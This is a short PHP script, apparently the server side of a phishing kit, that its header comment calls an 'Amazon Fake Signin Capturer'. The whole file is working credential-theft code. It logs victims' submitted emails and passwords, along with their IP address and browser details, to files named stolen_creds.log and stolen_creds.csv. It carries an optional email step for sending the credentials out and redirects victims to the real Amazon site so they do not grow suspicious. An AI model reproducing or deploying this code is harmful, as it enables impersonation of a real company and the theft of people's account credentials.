<?php
// scam.php - Amazon Fake Signin Capturer

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email    = isset($_POST['email'])    ? trim($_POST['email'])    : '';
    $password = isset($_POST['password']) ? trim($_POST['password']) : '';
    $action   = isset($_POST['action'])   ? $_POST['action']         : '';
    $source   = isset($_POST['source'])   ? $_POST['source']         : '';
    $timestamp = isset($_POST['timestamp']) ? $_POST['timestamp']    : '';

    // IP & info del navegador del "victima"
    $ip        = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
    $referer   = $_SERVER['HTTP_REFERER'] ?? 'none';
    $date      = date('Y-m-d H:i:s T');

    // Guardar en archivo de log
    $logFile = __DIR__ . '/stolen_creds.log';
    $logEntry = "==================================================\n";
    $logEntry .= "Date: $date\n";
    $logEntry .= "IP:   $ip\n";
    $logEntry .= "Email:    $email\n";
    $logEntry .= "Password: $password\n";
    $logEntry .= "Agent:  $userAgent\n";
    $logEntry .= "Ref:    $referer\n";
    $logEntry .= "==================================================\n";

    file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);

    // Opcional: guardar como CSV
    $csvFile = __DIR__ . '/stolen_creds.csv';
    if (!file_exists($csvFile)) {
        file_put_contents($csvFile, "Date,IP,Email,Password,UserAgent\n");
    }
    $csvEntry = "$date,$ip,\"$email\",\"$password\",\"$userAgent\"\n";
    file_put_contents($csvFile, $csvEntry, FILE_APPEND | LOCK_EX);

    // Opcional: enviar por email (descomentar si hay SMTP)
    // mail('tu-email@gmail.com', 'Amazon Cred captured', "Email: $email\nPassword: $password\nIP: $ip");
}

// Redirigir a Amazon real para que no sospeche
header('Location: https://www.amazon.com');
exit;
?>
